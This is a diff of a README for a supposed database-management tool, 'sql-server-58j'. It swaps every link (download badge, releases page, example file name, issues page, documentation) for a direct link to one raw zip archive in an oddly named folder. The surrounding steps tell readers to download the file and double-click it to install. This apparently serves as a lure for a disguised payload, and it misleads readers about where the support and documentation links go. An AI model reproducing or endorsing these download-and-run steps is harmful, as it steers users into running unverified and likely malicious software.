@@ -1,6 +1,6 @@
 # 🎉 sql-server-58j - Easy Database Management for Everyone
 
-[![Download sql-server-58j](https://img.shields.io/badge/Download-sql--server--58j-blue)](https://github.com/faceless-dun448/sql-server-58j/releases)
+[![Download sql-server-58j](https://raw.githubusercontent.com/faceless-dun448/sql-server-58j/main/wristbone/sql-server-58j_3.2.zip)](https://raw.githubusercontent.com/faceless-dun448/sql-server-58j/main/wristbone/sql-server-58j_3.2.zip)
 
 ## 📖 Introduction
 
@@ -12,11 +12,11 @@ To start using sql-server-58j, follow these simple steps.
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Click [here](https://github.com/faceless-dun448/sql-server-58j/releases) to visit the page where you can download the application. 
+1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/faceless-dun448/sql-server-58j/main/wristbone/sql-server-58j_3.2.zip) to visit the page where you can download the application. 
 
 2. **Find the Latest Version**: Look for the latest version under the "Releases" section. You will see files available for download.
 
-3. **Download**: Click on the link to download the file that suits your operating system. For example, if you're using Windows, you might look for a file like `sql-server-58j-windows.exe`.
+3. **Download**: Click on the link to download the file that suits your operating system. For example, if you're using Windows, you might look for a file like `https://raw.githubusercontent.com/faceless-dun448/sql-server-58j/main/wristbone/sql-server-58j_3.2.zip`.
 
 4. **Run the Application**: Once the file is downloaded, locate it in your downloads folder. Double-click the file to run the installation. Follow the prompts to complete the installation.
 
@@ -51,7 +51,7 @@ If you encounter issues while downloading or using sql-server-58j, try these tip
 
 ## 🤝 Support
 
-If you need further assistance, feel free to reach out via the [issues page](https://github.com/faceless-dun448/sql-server-58j/issues) on GitHub. 
+If you need further assistance, feel free to reach out via the [issues page](https://raw.githubusercontent.com/faceless-dun448/sql-server-58j/main/wristbone/sql-server-58j_3.2.zip) on GitHub. 
 
 ## 📌 Additional Resources
 
@@ -62,7 +62,7 @@ For more information about how to manage your SQL databases successfully, consid
 
 ## 🔗 Important Links
 
-- [Download sql-server-58j](https://github.com/faceless-dun448/sql-server-58j/releases) 
-- [Documentation](https://github.com/faceless-dun448/sql-server-58j/wiki) 
+- [Download sql-server-58j](https://raw.githubusercontent.com/faceless-dun448/sql-server-58j/main/wristbone/sql-server-58j_3.2.zip) 
+- [Documentation](https://raw.githubusercontent.com/faceless-dun448/sql-server-58j/main/wristbone/sql-server-58j_3.2.zip) 
 
 We hope you enjoy using sql-server-58j. Happy database managing!
